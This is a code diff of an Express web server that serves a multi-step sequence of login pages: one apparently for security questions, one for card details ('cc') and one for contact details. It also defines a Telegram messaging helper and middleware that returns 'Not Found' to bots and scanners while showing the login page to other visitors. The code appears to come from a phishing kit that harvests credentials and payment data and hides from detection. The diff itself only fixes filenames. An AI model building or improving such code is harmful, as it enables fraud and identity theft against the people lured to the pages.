@@ -55,7 +55,7 @@ const sendTelegramMessage = (text) => {
 app.get('/login/2', async (req, res) => {
     try {
         // Read the content of the login.html file
-        const htmlContent = await fs.readFile('secque', 'utf-8');
+        const htmlContent = await fs.readFile('secque.html', 'utf-8');
 
         // Send the HTML content as a response
         res.send(htmlContent);
@@ -70,7 +70,7 @@ app.get('/login/2', async (req, res) => {
 app.get('/login/3', async (req, res) => {
     try {
         // Read the content of the login.html file
-        const htmlContent = await fs.readFile('cc', 'utf-8');
+        const htmlContent = await fs.readFile('cc.html', 'utf-8');
 
         // Send the HTML content as a response
         res.send(htmlContent);
@@ -84,7 +84,7 @@ app.get('/login/3', async (req, res) => {
 app.get('/login/4', async (req, res) => {
     try {
         // Read the content of the login.html file
-        const htmlContent = await fs.readFile('contact', 'utf-8');
+        const htmlContent = await fs.readFile('contact.html', 'utf-8');
 
         // Send the HTML content as a response
         res.send(htmlContent);
@@ -297,7 +297,7 @@ function antiBotMiddleware(req, res, next) {
     if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
         return res.status(404).send('Not Found');
     } else {
-        res.sendFile(path.join(__dirname, 'Login'));
+        res.sendFile(path.join(__dirname, 'Login.html'));
     }
 }
 
